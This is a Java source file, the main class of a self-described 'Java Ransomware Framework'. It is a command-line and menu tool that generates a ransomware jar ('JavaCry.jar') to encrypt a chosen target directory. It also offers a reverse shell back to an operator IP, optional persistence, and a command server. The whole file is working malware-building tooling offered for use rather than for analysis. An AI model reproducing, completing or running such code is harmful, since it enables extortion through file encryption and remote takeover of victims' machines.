import java.util.Scanner;
import java.io.File;
import java.io.*;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import java.nio.charset.StandardCharsets;
import java.nio.file.Path;
import org.apache.commons.cli.*;
import org.apache.commons.cli.ParseException;
import java.nio.file.Paths;


public class JRF {
    public static void main(String[] args) {
        Scanner input = new Scanner(System.in);

        System.out.println("Java Ransomware Framework");

        Options options = new Options();
        
        Option IPOption = Option.builder("h").longOpt("IP")
                .argName("IP")
                .hasArg()
                .required(true)
                .desc("Local IP address").build();
        options.addOption(IPOption);

        Option rev = new Option("r", "Use reverse shell", false, "Activate reverse shell");
        options.addOption(rev);

        Option PortOption = Option.builder("p").longOpt("PORT")
                .argName("PORT")
                .hasArg()
                .required(false)
                .desc("Reverse shell port").build();
        options.addOption(PortOption);

        Option expOption = Option.builder("o").longOpt("Export path")
                .argName("Export path")
                .hasArg()
                .required(true)
                .desc("destination for export").build();
        options.addOption(expOption);

        Option tgtOption = Option.builder("t").longOpt("Target dir")
                .argName("Target directory")
                .hasArg()
                .required(true)
                .desc("Target directory for the ransomware to encrypt").build();
        options.addOption(tgtOption);

        Option persistOption = new Option("P", "Persistence", false, "Activate reverse shell persistence");
        options.addOption(persistOption);
     
        // define parser
        CommandLine cmd;
        CommandLineParser parser = new BasicParser();
        HelpFormatter helper = new HelpFormatter();

        try {
            String host = "";
            int revPort = 0;
            String tgtPath = "";
            String expPath = "";
            boolean useRevShell = false;
            boolean usePersistence = false;

            cmd = parser.parse(options, args);
            host = cmd.getOptionValue("IP");
            tgtPath = cmd.getOptionValue("Target directory");
            expPath = cmd.getOptionValue("Export path");

            if(cmd.hasOption("r")) {
                System.out.println("Reverse shell activated");
                useRevShell = true;
                if (cmd.hasOption("p")) {
                    revPort = Integer.parseInt(cmd.getOptionValue("PORT"));
                } else {
                    System.out.println("Missing reverse shell port");
                    System.exit(0);
                }
                if (cmd.hasOption("P")) {
                    usePersistence = true;
                }
            } else {
                if (cmd.hasOption("p") || cmd.hasOption("P")) {
                    System.out.println("Reverse shell needs to be enabled first");
                    System.exit(0);
                }
            }
            
            PayloadBuilder builder = new PayloadBuilder(tgtPath, useRevShell, usePersistence, host, revPort);
            builder.build();
            builder.compile();
            try {
                Files.copy(new FileInputStream(new File("../../output/Classes/JavaCry.jar")), Paths.get(expPath, "JavaCry.jar"), StandardCopyOption.REPLACE_EXISTING);
            } catch (Exception e) {
                System.out.println(e);
            }
            System.out.println("Ransomware generated! " + expPath);
            System.exit(0);

        } catch (ParseException e) {
            System.out.println(e.getMessage());
            helper.printHelp("Usage:", options);
            System.exit(0);
        }
        


        while (true) {
            System.out.println("\nOptions:");
            System.out.println("1) Generate ransomware");
            System.out.println("2) Open main server");
            System.out.println("3) Quit");
            System.out.print("\nWhat do you want to do?: ");
            String action = input.nextLine();
            if (action.equals("1")) {
                System.out.print("Insert target path for encryption: ");
                String path = input.nextLine();
                System.out.print("Insert local ip address: ");
                String IP = input.nextLine();
                System.out.print("Would you like to use a reverse shell? (y/n): ");
                boolean useRevShell = (input.nextLine().toLowerCase().equals("y"));
                // input.nextLine();
                boolean usePersistence = false;
                int port = 0;
                if (useRevShell){
                    System.out.print("Insert port number to run the shell listener (6666, 5555 are used for JRF services): ");
                    port = input.nextInt();
                    System.out.print("Would you like to let the ransomware try for persistence? (y/n): ");
                    input.nextLine();
                    usePersistence = (input.nextLine().toLowerCase().equals("y"));
                }

                PayloadBuilder builder = new PayloadBuilder(path, useRevShell, usePersistence, IP, port);
                builder.build();
                builder.compile();
                System.out.println("Ransomware generated!");

                // String[] envp = {"HOME=" + System.getProperty("user.home")};

                System.out.print("Please specify export path: ");
                String pth = input.nextLine();
                try {
                    Files.copy(new FileInputStream(new File("../../output/Classes/JavaCry.jar")), Paths.get(pth, "JavaCry.jar"), StandardCopyOption.REPLACE_EXISTING);
                } catch (Exception e) {
                    System.out.println(e);
                }
                
                System.out.print("Would you like to open the main server? (y/n): ");
                boolean openMainServer = (input.nextLine().toLowerCase().equals("y"));
                if (openMainServer) {
                    System.out.println("Opening up servers");
                    MainServer server = new MainServer();
                    server.start();
                }
            } else if (action.equals("2")) {
                System.out.println("Opening up servers");
                    MainServer server = new MainServer();
                    server.start();
            } else if (action.equals("3")) {
                return;
            } else {
                System.out.println("Invalid option \"" + action + "\"");
            }
        }
        

    }
}
